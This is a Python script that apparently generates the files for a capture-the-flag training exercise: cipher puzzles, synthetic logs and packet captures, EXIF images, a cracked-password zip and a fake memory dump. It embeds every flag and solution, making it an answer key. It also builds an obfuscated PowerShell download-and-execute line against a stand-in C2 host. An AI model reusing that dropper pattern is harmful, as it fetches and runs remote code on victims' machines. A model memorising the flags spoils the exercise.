#!/usr/bin/env python3
"""Operation Cipherfall — challenge artifact generator.
Builds every file-based challenge (Groups A + B) into ./challenges/<id>/.
Kept OUT of the repo so plaintext flags live in only one place: the artifacts
themselves (which necessarily embed them). Re-runnable and deterministic.
"""
import os, base64, random, struct, hashlib, io, json

ROOT = os.path.dirname(os.path.abspath(__file__))   # tools/
PROJ = os.path.dirname(ROOT)                          # project root
OUT  = os.path.join(PROJ, "challenges")
random.seed(1337)  # deterministic noise

def d(cid):
    p = os.path.join(OUT, f"{cid:02d}")
    os.makedirs(p, exist_ok=True)
    return p

def w(cid, name, data, mode="wb"):
    p = os.path.join(d(cid), name)
    with open(p, mode) as f:
        f.write(data)
    return p

manifest = {}
def reg(cid, files, note=""):
    manifest[cid] = {"files": files, "note": note}

# --- flags (from the verified answer key) ---
F = {
 1:"FLAG{w3lc0me_t0_th3_gam3}", 2:"FLAG{hail_caesar_shift}",
 4:"FLAG{cl34rt3xt_1s_d4ng3r0us}", 5:"FLAG{m3t4d4t4_t3lls_t4l3s}",
 6:"FLAG{str1ngs_4r3_y0ur_fr13nd}", 7:"FLAG{rotation_is_not_encryption}",
 8:"FLAG{cr4ck1ng_w34k_p4sswords}", 11:"FLAG{ftp_s3nds_1t_4ll_cl34r}",
 12:"FLAG{eiffel_tower}", 16:"FLAG{x0r_15_r3v3rs1bl3}",
 17:"FLAG{l0g_4n4lys1s_w1ns}", 18:"FLAG{m3m0ry_n3v3r_f0rg3ts}",
 22:"FLAG{st4t1c_4n4lys1s_s4f3}", 26:"FLAG{l1n34r_c0ngru3nt14l_g3n3r4t0r}",
}

# ===== Group A =====================================================
# Ch1 — nested base64
w(1, "briefing.txt",
  "V2VsY29tZSBhYm9hcmQuIFRoZSB2YXVsdCBjb2RlIGlzOiBSa3hCUjN0M00yeGpNRzFsWDNRd1gzUm9NMTluWVcwemZRPT0=\n".encode())
reg(1, ["briefing.txt"], "Decode Base64 twice (nested).")

# Ch2 — Caesar +7
w(2, "note.txt", "MSHN{ohps_jhlzhy_zopma}\n".encode())
reg(2, ["note.txt"], "Caesar/shift cipher; brute force 25 shifts.")

# Ch6 — 2MB blob, one readable string
blob = bytearray(random.getrandbits(8) for _ in range(2*1024*1024))
# keep the flag out of any accidental collision: place at a random offset, ascii
needle = ("\x00\x00" + F[6] + "\x00\x00").encode()
pos = random.randint(1000, len(blob)-len(needle)-1000)
blob[pos:pos+len(needle)] = needle
w(6, "data.bin", bytes(blob))
reg(6, ["data.bin"], "strings data.bin | grep FLAG")

# Ch7 — ROT21 (decode +5)
w(7, "rotated.txt", "AGVB{mjovodji_dn_ijo_zixmtkodji}\n".encode())
reg(7, ["rotated.txt"], "ROT-N brute force (not 13).")

# Ch16 — single-byte XOR hex
w(16, "cipher.hex", "040e0305393a72301d73771d30713471303173202e713f\n".encode())
reg(16, ["cipher.hex"], "Single-byte XOR; crib FLAG{ -> key 0x42.")

# Ch17 — access.log, 500k lines, one attacker 401xN then a single 200
def rand_ip():
    return f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
paths = ["/","/index.html","/about","/products","/static/app.js","/api/status","/favicon.ico","/css/site.css"]
uas = ['"Mozilla/5.0 (Windows NT 10.0)"','"Mozilla/5.0 (X11; Linux x86_64)"','"curl/7.88.1"']
attacker = "203.0.113.47"
lines = []
TOTAL = 500_000
# schedule: attacker does ~350 x 401 to /login spread out, then exactly one 200
attack_slots = sorted(random.sample(range(50_000, 480_000), 350))
success_slot = 485_000
aset = set(attack_slots)
import datetime
base_t = datetime.datetime(2026,3,14,8,0,0)
for i in range(TOTAL):
    t = (base_t + datetime.timedelta(seconds=i//8)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    if i in aset:
        ip, meth, path, code, size = attacker, "POST", "/login", 401, 0
    elif i == success_slot:
        ip, meth, path, code, size = attacker, "GET", f"/dashboard?token={F[17]}", 200, 512
    else:
        ip = rand_ip()
        meth = "GET"; path = random.choice(paths)
        code = random.choice([200,200,200,200,304,404]); size = random.randint(120,8000)
    ua = random.choice(uas)
    lines.append(f'{ip} - - [{t}] "{meth} {path} HTTP/1.1" {code} {size} "-" {ua}')
w(17, "access.log", ("\n".join(lines)+"\n").encode())
reg(17, ["access.log"], "Count 401s per IP; find the one IP's single 200.")

# Ch22 — obfuscated PowerShell dropper (defanged, non-executing text)
inner = f'IEX (New-Object Net.WebClient).DownloadString("http://malware-c2.test/gate/{F[22]}/beacon")'
b64cmd = base64.b64encode(inner.encode("utf-16-le")).decode()
# split into concatenated chunks to force reassembly
chunks = [b64cmd[i:i+24] for i in range(0, len(b64cmd), 24)]
concat = " + ".join(f'"{c}"' for c in chunks)
ps = (
 "# Recovered from malicious.docm VBA AutoOpen (DEFANGED - does not execute)\r\n"
 "$ErrorActionPreference = 'SilentlyContinue'\r\n"
 f"$b = {concat}\r\n"
 "$cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))\r\n"
 "# powershell.exe -NoP -W Hidden -Enc $b   <-- original invocation, neutered\r\n"
)
w(22, "dropper.ps1.txt", ps.encode())
reg(22, ["dropper.ps1.txt"], "Reassemble string, Base64-decode (do NOT run). C2 URL holds flag.")

# Ch26 — crypto brief
brief = (
 "OPERATION CIPHERFALL — Cryptanalysis Brief\n"
 "==========================================\n\n"
 'A junior dev built a "one-time pad" that is really an LCG-keystream XOR cipher.\n\n'
 "Keystream (Linear Congruential Generator):\n"
 "  x_{n+1} = (a * x_n + c) mod m\n"
 "  a = 1103515245\n"
 "  c = 12345\n"
 "  m = 2147483648\n"
 "  Each step outputs one byte:  (x >> 16) & 0xFF\n"
 "  That byte is XORed against the plaintext byte.\n\n"
 "The seed is unknown but small: 0 <= seed <= 65535.\n\n"
 "Ciphertext (hex):\n"
 "  e958f315878a1a8e6030865cb0c1f3e869bb50e53b462dc1b33be7f97f536ea0c88735\n\n"
 "Recover the plaintext. (Hint: the plaintext begins with the flag prefix.)\n"
)
w(26, "crypto_brief.txt", brief.encode())
reg(26, ["crypto_brief.txt"], "Reimplement LCG; brute force 16-bit seed with FLAG{ crib.")

# ===== Group B =====================================================
# Ch4 — capture.pcap: cleartext HTTP POST /login
from scapy.all import Ether, IP, TCP, Raw, wrpcap
def http_session(pcap_path, cip, sip, cport, sport, req_bytes, resp_bytes):
    pkts = []
    cmac, smac = "02:00:00:00:00:01", "02:00:00:00:00:02"
    seqc, seqs = 1000, 5000
    def eth(a,b): return Ether(src=a, dst=b)
    # handshake
    pkts.append(eth(cmac,smac)/IP(src=cip,dst=sip)/TCP(sport=cport,dport=sport,flags="S",seq=seqc))
    pkts.append(eth(smac,cmac)/IP(src=sip,dst=cip)/TCP(sport=sport,dport=cport,flags="SA",seq=seqs,ack=seqc+1))
    pkts.append(eth(cmac,smac)/IP(src=cip,dst=sip)/TCP(sport=cport,dport=sport,flags="A",seq=seqc+1,ack=seqs+1))
    seqc+=1; seqs+=1
    # request
    pkts.append(eth(cmac,smac)/IP(src=cip,dst=sip)/TCP(sport=cport,dport=sport,flags="PA",seq=seqc,ack=seqs)/Raw(req_bytes))
    seqc+=len(req_bytes)
    pkts.append(eth(smac,cmac)/IP(src=sip,dst=cip)/TCP(sport=sport,dport=cport,flags="A",seq=seqs,ack=seqc))
    # response
    pkts.append(eth(smac,cmac)/IP(src=sip,dst=cip)/TCP(sport=sport,dport=cport,flags="PA",seq=seqs,ack=seqc)/Raw(resp_bytes))
    seqs+=len(resp_bytes)
    pkts.append(eth(cmac,smac)/IP(src=cip,dst=sip)/TCP(sport=cport,dport=sport,flags="A",seq=seqc,ack=seqs))
    # teardown
    pkts.append(eth(cmac,smac)/IP(src=cip,dst=sip)/TCP(sport=cport,dport=sport,flags="FA",seq=seqc,ack=seqs))
    pkts.append(eth(smac,cmac)/IP(src=sip,dst=cip)/TCP(sport=sport,dport=cport,flags="FA",seq=seqs,ack=seqc+1))
    wrpcap(pcap_path, pkts)

body4 = f"user=admin&pass=hunter2&note={F[4]}"
req4 = (f"POST /login HTTP/1.1\r\nHost: portal.cipherfall.test\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body4)}\r\n\r\n{body4}").encode()
resp4 = ("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 22\r\n\r\n"
         "<h1>Login received</h1>").encode()
http_session(os.path.join(d(4),"capture.pcap"), "10.10.10.5","10.10.10.20",49512,80,req4,resp4)
reg(4, ["capture.pcap"], "Follow HTTP stream of the POST /login.")

# Ch5 — profile.jpg with EXIF comment
from PIL import Image
import piexif
def make_jpg_with_exif(path, exif_dict, size=(600,400), color=(40,60,90)):
    img = Image.new("RGB", size, color)
    # a little texture so it's not a flat block
    px = img.load()
    for _ in range(4000):
        x=random.randint(0,size[0]-1); y=random.randint(0,size[1]-1)
        px[x,y]=(random.randint(30,120),random.randint(40,90),random.randint(80,160))
    img.save(path, "jpeg", quality=85, exif=piexif.dump(exif_dict))

exif5 = {"0th":{}, "Exif":{}, "GPS":{}, "1st":{}, "thumbnail":None}
exif5["0th"][piexif.ImageIFD.ImageDescription] = F[5].encode()
exif5["0th"][piexif.ImageIFD.Make] = b"Cipherfall"
exif5["Exif"][piexif.ExifIFD.UserComment] = b"\x00\x00\x00\x00" + F[5].encode()
make_jpg_with_exif(os.path.join(d(5),"profile.jpg"), exif5, color=(70,70,80))
reg(5, ["profile.jpg"], "exiftool profile.jpg -> ImageDescription/UserComment.")

# Ch12 — leak.jpg with GPS EXIF (Eiffel Tower 48.8584N, 2.2945E)
def deg_to_dms_rational(dd):
    dd=abs(dd); d0=int(dd); m0=int((dd-d0)*60); s0=round((dd-d0-m0/60)*3600*100)
    return ((d0,1),(m0,1),(s0,100))
lat, lon = 48.8584, 2.2945
exif12 = {"0th":{}, "Exif":{}, "GPS":{}, "1st":{}, "thumbnail":None}
exif12["GPS"][piexif.GPSIFD.GPSLatitudeRef]="N"
exif12["GPS"][piexif.GPSIFD.GPSLatitude]=deg_to_dms_rational(lat)
exif12["GPS"][piexif.GPSIFD.GPSLongitudeRef]="E"
exif12["GPS"][piexif.GPSIFD.GPSLongitude]=deg_to_dms_rational(lon)
exif12["0th"][piexif.ImageIFD.Make]=b"WhistleCam"
make_jpg_with_exif(os.path.join(d(12),"leak.jpg"), exif12, color=(120,110,100))
reg(12, ["leak.jpg"], "Read GPS EXIF -> map coords -> landmark name. Flag NOT in file.")

# Ch8 — encrypted zip (traditional ZipCrypto so fcrackzip works) + pets wordlist
import zipfile
inner_name = "flag.txt"
inner_data = (F[8]+"\n").encode()
# pyzipper supports AES; but fcrackzip needs ZipCrypto. Use stdlib-compatible
# traditional encryption via pyzipper's ZIP_STORED + setpassword? pyzipper writes AES.
# Traditional ZipCrypto writer:
import struct as _struct, binascii, time
def _crc32(b): return binascii.crc32(b) & 0xffffffff
class _ZipCrypto:
    def __init__(self, pw):
        self.k0,self.k1,self.k2=305419896,591751049,878082192
        for c in pw: self._u(c)
    def _crc(self,c,b): return (c>>8)^_CRCTAB[(c^b)&0xff]
    def _u(self,ch):
        self.k0=self._crc(self.k0,ch)
        self.k1=(self.k1+(self.k0&0xff))&0xffffffff
        self.k1=(self.k1*134775813+1)&0xffffffff
        self.k2=self._crc(self.k2,(self.k1>>24)&0xff)
    def _byte(self):
        t=(self.k2|2)&0xffff
        return ((t*(t^1))>>8)&0xff
    def enc(self,data):
        out=bytearray()
        for b in data:
            c=self._byte(); out.append(b^c); self._u(b)
        return bytes(out)
_CRCTAB=[]
for _n in range(256):
    _c=_n
    for _ in range(8):
        _c=(0xedb88320^(_c>>1)) if (_c&1) else (_c>>1)
    _CRCTAB.append(_c&0xffffffff)

def write_zipcrypto(path, name, data, password):
    pw=password.encode()
    crc=_crc32(data)
    # encryption header: 12 bytes, last byte = high byte of crc (verification)
    hdr=bytes(random.randint(0,255) for _ in range(11))+bytes([(crc>>24)&0xff])
    z=_ZipCrypto(pw)
    enc=z.enc(hdr+data)
    comp=enc  # stored (method 0)
    flags=0x0001  # encrypted
    dostime=0; dosdate=0x21<<5  # arbitrary valid-ish
    lf=b"PK\x03\x04"+_struct.pack("<HHHHHIIIHH",20,flags,0,dostime,dosdate,crc,len(comp),len(data),len(name),0)+name.encode()
    body=lf+comp
    off=0
    cd=b"PK\x01\x02"+_struct.pack("<HHHHHHIIIHHHHHII",20,20,flags,0,dostime,dosdate,crc,len(comp),len(data),len(name),0,0,0,0,0,off)+name.encode()
    eocd=b"PK\x05\x06"+_struct.pack("<HHHHIIH",0,0,1,1,len(cd),len(body),0)
    with open(path,"wb") as f:
        f.write(body+cd+eocd)

write_zipcrypto(os.path.join(d(8),"secret.zip"), inner_name, inner_data, "max2019")
pets=["max","bella","charlie","luna","cooper","lucy","buddy","daisy","rocky","molly",
      "bear","sadie","duke","maggie","tucker","bailey","oliver","sophie","jack","chloe",
      "toby","lola","zeus","ruby","teddy","gracie","murphy","penny","bentley","stella",
      "milo","zoey","leo","nala","oscar","coco","winston","rosie","riley","lily",
      "shadow","abby","gus","piper","henry","willow","finn","ellie","louie","mia"]
w(8, "pets.txt", ("\n".join(pets)+"\n").encode())
reg(8, ["secret.zip","pets.txt"], "password = pet name + year (1990-2025). max2019. Crack with fcrackzip/John.")

# Ch11 — office.pcap: FTP control (USER/PASS/RETR) + FTP-DATA carrying the flag
def ftp_pcap(path):
    pkts=[]
    cmac,smac="02:00:00:00:00:11","02:00:00:00:00:22"
    cip,sip="192.168.1.50","192.168.1.10"
    cport,ctrl=51000,21
    from scapy.all import Ether,IP,TCP,Raw
    def line(frm,to,fp,tp,payload,sq,ak):
        return Ether(src=frm,dst=to)/IP(src=(cip if frm==cmac else sip),dst=(sip if frm==cmac else cip))/TCP(sport=fp,dport=tp,flags="PA",seq=sq,ack=ak)/Raw(payload.encode())
    sc,ss=1,1
    convo=[("S","220 Cipherfall FTP ready\r\n"),
           ("C","USER analyst\r\n"),("S","331 Password required\r\n"),
           ("C","PASS Spring2026!\r\n"),("S","230 Login successful\r\n"),
           ("C","TYPE I\r\n"),("S","200 Type set to I\r\n"),
           ("C","PASV\r\n"),("S","227 Entering Passive Mode (192,168,1,10,200,1)\r\n"),
           ("C","RETR flag.txt\r\n"),("S","150 Opening data connection\r\n"),
           ("S","226 Transfer complete\r\n")]
    for who,txt in convo:
        if who=="C":
            pkts.append(line(cmac,smac,cport,ctrl,txt,sc,ss)); sc+=len(txt)
        else:
            pkts.append(line(smac,cmac,ctrl,cport,txt,ss,sc)); ss+=len(txt)
    # data channel (server port 200*256+1=51201) delivering the flag file
    dport=200*256+1
    ds,dd=9000,9000
    payload=(F[11]+"\n")
    pkts.append(Ether(src=smac,dst=cmac)/IP(src=sip,dst=cip)/TCP(sport=dport,dport=52000,flags="PA",seq=ds,ack=dd)/Raw(payload.encode()))
    from scapy.all import wrpcap
    wrpcap(path,pkts)
ftp_pcap(os.path.join(d(11),"office.pcap"))
reg(11, ["office.pcap"], "Filter ftp/ftp-data; follow data stream (RETR flag.txt).")

# Ch14 — guest JWT (static input; flag comes from the /admin service = not self-contained)
jwt=("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
     "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9."
     "BYO5nvK97u0HfTYr4DuyKY61inIIrLbTXL1rtdVOp7I")
w(14, "guest_token.txt", (jwt+"\n").encode())
w(14, "README.txt", ("Crack the HS256 secret (rockyou), forge role=admin, present to /admin.\n"
                     "NOTE: the flag is returned by the /admin web service, which is a\n"
                     "separate hosted component (not included in this file bundle).\n").encode())
reg(14, ["guest_token.txt","README.txt"], "SERVICE-DEPENDENT: crack secret (password123), forge admin token. Flag from /admin service, not the file.")

# Ch18 — mini.dmp: fake memory fragment, MasterPassword= anchor + real flag adjacent, decoys
size=12*1024*1024
buf=bytearray(random.getrandbits(8) for _ in range(size))
def stamp(s, at):
    b=s.encode(); buf[at:at+len(b)]=b
# scatter decoys
for i,dec in enumerate(["FLAG{not_this_one}","FLAG{keep_looking}","FLAG{almost_but_no}"]):
    stamp("\x00"+dec+"\x00", random.randint(100000, size-100000))
# real region near MasterPassword=
anchor_at=random.randint(2_000_000, size-2_000_000)
stamp("\x00\x00KeePass.exe\x00MasterPassword=Tr0ub4dor&3\x00"+F[18]+"\x00\x00", anchor_at)
w(18,"mini.dmp",bytes(buf))
reg(18, ["mini.dmp"], "strings + context: real flag is adjacent to 'MasterPassword='. Others are decoys.")

# ---- write manifest for the wiring step ----
with open(os.path.join(OUT, "manifest.json"), "w") as f:
    json.dump(manifest, f, indent=2)

# ---- verify every embedded flag round-trips ----
print("Built artifacts under", OUT)
for cid in sorted(manifest):
    print(f"  {cid:02d}: {', '.join(manifest[cid]['files'])}")
